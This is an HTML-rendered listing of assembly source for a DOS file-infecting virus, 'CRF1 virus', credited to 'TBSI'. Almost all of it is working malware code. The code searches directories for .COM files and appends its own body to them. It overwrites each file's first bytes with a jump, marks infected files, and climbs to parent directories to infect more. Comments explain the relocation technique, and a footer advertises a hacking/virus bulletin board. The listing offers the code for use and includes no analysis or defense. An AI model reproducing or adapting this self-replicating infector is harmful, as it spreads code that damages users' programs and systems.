<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>CRF.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">    </span><span class="sc9">title</span><span class="sc0"> </span><span class="sc3">"CRF1 virus.  Born on the Fourth of July.  Written by TBSI."</span><span class="sc0">
                            </span><span class="sc9">page</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0">                        </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">
                            </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
                            </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">main</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc1">;edure</span><span class="sc0">


</span><span class="sc1">; As referenced in this source listing, Top-Of-File represents location 100h in</span><span class="sc0">
</span><span class="sc1">; the current memory segment, which is where the virus code is loaded into mem.</span><span class="sc0">
</span><span class="sc1">; The word "program" refers to the infected programs code and "virus" refers to</span><span class="sc0">
</span><span class="sc1">; the virus's code.  This information is included to clarify my use of the word</span><span class="sc0">
</span><span class="sc1">; "program" in the remarks throughout this listing.</span><span class="sc0">

</span><span class="sc1">; Since the virus (with the exception of "call skip" and "db 26") can be loaded</span><span class="sc0">
</span><span class="sc1">; anywhere in memory depending on the length of the infected program, I made it</span><span class="sc0">
</span><span class="sc1">; to where the BP register would be loaded with the displacement of the code in</span><span class="sc0">
</span><span class="sc1">; memory.  This was done as follows:</span><span class="sc0">
</span><span class="sc1">;             1) a CALL instruction was issued.  It places the TRUE return</span><span class="sc0">
</span><span class="sc1">;                 address onto the stack.</span><span class="sc0">
</span><span class="sc1">;             2) instead of returning to there, the value was popped off of</span><span class="sc0">
</span><span class="sc1">;                 the stack into the BP register</span><span class="sc0">
</span><span class="sc1">;             3) then, it subtracts the EXPECTED value of BP (the address of</span><span class="sc0">
</span><span class="sc1">;                 EOFMARK in the 1st-time copy) from BP to get the offset.</span><span class="sc0">
</span><span class="sc1">;             4) all references to memory locations were thereafter changed</span><span class="sc0">
</span><span class="sc1">;                 to refernces to EXPECTED memory locations + BP</span><span class="sc0">
</span><span class="sc1">; This fixed the problem.</span><span class="sc0">




</span><span class="sc5">tof</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;Top-Of-File</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">         </span><span class="sc1">;Skip over program</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">                 </span><span class="sc1">;Reserve 3rd byte</span><span class="sc0">
</span><span class="sc5">EOFMARK</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">26</span><span class="sc0">              </span><span class="sc1">;Disable DOS's TYPE</span><span class="sc0">

</span><span class="sc5">first_four</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">nop</span><span class="sc0">                 </span><span class="sc1">;First run copy only!</span><span class="sc0">
</span><span class="sc5">address</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">;First run copy only!</span><span class="sc0">
</span><span class="sc5">check</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">nop</span><span class="sc0">                 </span><span class="sc1">;First run copy only!</span><span class="sc0">

</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">nextline</span><span class="sc0">            </span><span class="sc1">;Push BP onto stack</span><span class="sc0">
</span><span class="sc5">nextline</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">;BP=location of Skip</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nextline</span><span class="sc0">      </span><span class="sc1">;BP=offset from 1st run</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;Reset infection count</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Original first 4 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tof</span><span class="sc0">           </span><span class="sc1">;TOF never changes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">;Lets copy 4 bytes</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                 </span><span class="sc1">;Read left-to-right</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;Copy the 4 bytes</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">              </span><span class="sc1">;Set DTA address ...</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ... to *our* DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to set DTA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">              </span><span class="sc1">;Find First ASCIIZ</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filespec</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;DS:DX -} '*.COM',0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Point to file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;Save DX</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc0">          </span><span class="sc1">;Continue...</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">              </span><span class="sc1">;Set DTA address ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">              </span><span class="sc1">; ... to default DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to set DTA</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;AX= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;BX= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;CX= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;DX= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;SI= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;DI= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0FFFEh</span><span class="sc0">           </span><span class="sc1">;SP= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">             </span><span class="sc1">;BP= 100h (RETurn addr)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">; Put on stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;BP= 0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;JMP to 100h</span><span class="sc0">

</span><span class="sc5">nextfile</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;Did we open the file?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">skipclose</span><span class="sc0">           </span><span class="sc1">;No, so don't close it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">              </span><span class="sc1">;Close file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to close it</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;Set BX back to 0</span><span class="sc0">
</span><span class="sc5">skipclose</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">              </span><span class="sc1">;Find Next ASCIIZ</span><span class="sc0">

</span><span class="sc5">continue</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;Restore DX</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;Re-save DX</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;CX= 0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Find First/Next</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">skipjmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NoneLeft</span><span class="sc0">            </span><span class="sc1">;Out of files</span><span class="sc0">

</span><span class="sc5">skipjmp</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">            </span><span class="sc1">;open file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">               </span><span class="sc1">;point to filespec</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to open file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">nextfile</span><span class="sc0">            </span><span class="sc1">;Next file if error</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;get the handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">              </span><span class="sc1">;Read from file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">;Read 4 bytes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Read in the first 4</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to read</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc4">],</span><span class="sc2">26</span><span class="sc0">   </span><span class="sc1">;Already infected?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">nextfile</span><span class="sc0">            </span><span class="sc1">;Yep, try again ...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">],</span><span class="sc2">77</span><span class="sc0">  </span><span class="sc1">;Mis-named .EXE?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">nextfile</span><span class="sc0">            </span><span class="sc1">;Yep, maybe next time!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">            </span><span class="sc1">;LSeek to EOF</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;CX= 0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">;DX= 0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to LSeek</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FD00h</span><span class="sc0">           </span><span class="sc1">;Longer than 63K?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nextfile</span><span class="sc0">            </span><span class="sc1">;Yep, try again...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">addr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Save call location</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">;Write to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">;Write 4 bytes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Point to buffer</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Save the first 4 bytes</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">;Write to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eof</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">  </span><span class="sc1">;Length of target code</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Point to virus start</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Append the virus</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">;LSeek to TOF</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;CX= 0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">;DX= 0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to LSeek</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">addr</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Retrieve location</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;Adjust location</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">address</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;address to call</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">  </span><span class="sc1">;JMP rel16 inst.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc4">],</span><span class="sc2">26</span><span class="sc0">   </span><span class="sc1">;EOFMARK</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">;Write to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">;Write 4 bytes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;4 bytes are at [DX]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Write to file</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;increment counter</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nextfile</span><span class="sc0">            </span><span class="sc1">;Any more?</span><span class="sc0">

</span><span class="sc5">NoneLeft</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;At least 2 infected?</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">TheEnd</span><span class="sc0">              </span><span class="sc1">;The party's over!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">             </span><span class="sc1">;DI= 100h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">20CDh</span><span class="sc0">     </span><span class="sc1">;an INT 20h?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">TheEnd</span><span class="sc0">              </span><span class="sc1">;Don't go to prev. dir.</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">prevdir</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;'..'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">              </span><span class="sc1">;Set current directory</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;CHDIR ..</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">TheEnd</span><span class="sc0">              </span><span class="sc1">;We're through!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc0">            </span><span class="sc1">;Start over in new dir</span><span class="sc0">

</span><span class="sc5">TheEnd</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">              </span><span class="sc1">;The party's over!</span><span class="sc0">

</span><span class="sc5">filespec</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;File specification</span><span class="sc0">
</span><span class="sc5">prevdir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;previous directory</span><span class="sc0">

</span><span class="sc1">; None of this information is included in the virus's code.  It is only used</span><span class="sc0">
</span><span class="sc1">; during the search/infect routines and it is not necessary to preserve it</span><span class="sc0">
</span><span class="sc1">; in between calls to them.</span><span class="sc0">

</span><span class="sc5">eof</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">DTA</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;internal search's data</span><span class="sc0">

</span><span class="sc5">attribute</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;attribute</span><span class="sc0">
</span><span class="sc5">file_time</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;file's time stamp</span><span class="sc0">
</span><span class="sc5">file_date</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;file's date stamp</span><span class="sc0">
</span><span class="sc5">file_size</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;file's size</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;filename</span><span class="sc0">

</span><span class="sc5">infected</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;infection count</span><span class="sc0">

</span><span class="sc10">addr</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;Address</span><span class="sc0">

                            </span><span class="sc5">main</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc1">;rocedure</span><span class="sc0">
                            </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc1">;egment</span><span class="sc0">

            </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">
</span><span class="sc1">; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc1">; 컴컴컴컴컴컴컴컴컴컴&gt; and Remember Don't Forget to Call &lt;컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc1">; 컴컴컴컴컴컴&gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;컴컴컴컴컴</span><span class="sc0">
